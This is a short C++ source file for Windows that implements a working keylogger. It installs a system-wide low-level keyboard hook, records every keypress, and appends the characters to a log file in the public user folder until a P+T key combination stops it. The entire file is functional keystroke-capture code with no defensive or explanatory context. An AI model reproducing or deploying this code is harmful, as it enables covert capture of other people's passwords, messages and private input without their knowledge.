#include <fstream>
#include <iostream>
#include <windows.h>
#include <set>

HHOOK* hook;
std::ofstream* file;
std::set<int>* keyMap;
const int exitCode[2] = {80,84};

int count = 0;

static char getKey(_In_ UINT uCode, _In_ UINT uMapType) {
    UINT scanCode = MapVirtualKey(uCode, MAPVK_VK_TO_VSC);

    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    WCHAR unicodeChar;
    if (ToUnicode(uCode, scanCode, keyboardState, &unicodeChar, 1, 0) == 1) {
        return static_cast<char>(unicodeChar);
    }

    return '\0'; // Return null character if conversion fails
}

//KeyHook
LRESULT CALLBACK KeyLogger(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT* vhStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
    int virtualKey = vhStruct->vkCode; //getting the key code

    //Mapping the keys
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        keyMap->insert(virtualKey);
        char key = getKey(virtualKey, MAPVK_VK_TO_CHAR);
        *file << key << "-";
        if (count == 10) {
            *file << "\n";
            count = 0;
        }
        file->flush();
        if (file->fail() || file->bad()) {
            std::cerr << "Error writing to the file.\n";
        }
        count++;
    }else
        if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            keyMap->erase(virtualKey);
        }

    bool exit = true;
    for (int i : exitCode) {
        if (keyMap->count(i) == 0) {
            exit = false;
            break;
        }
    }
    if (exit) {
        PostQuitMessage(0);
    }

    return CallNextHookEx(*hook,code,wParam,lParam);
}

int main()
{
    std::cout << "Project startup\n";

    hook = new HHOOK();
    *hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyLogger, GetModuleHandle(nullptr), 0);

    file = new std::ofstream();
    file->open("C:/Users/Public/log_file_.txt", std::ios_base::app);

    keyMap = new std::set<int>();

    MSG msg;
    bool isRunning = true;
    while (isRunning && GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        if (msg.message == WM_QUIT) {
            isRunning = false;
        }
    }

    file->close();
    delete file;

    keyMap->clear();
    delete keyMap;

    UnhookWindowsHookEx(*hook);
    delete hook;
    
    return 0;
}
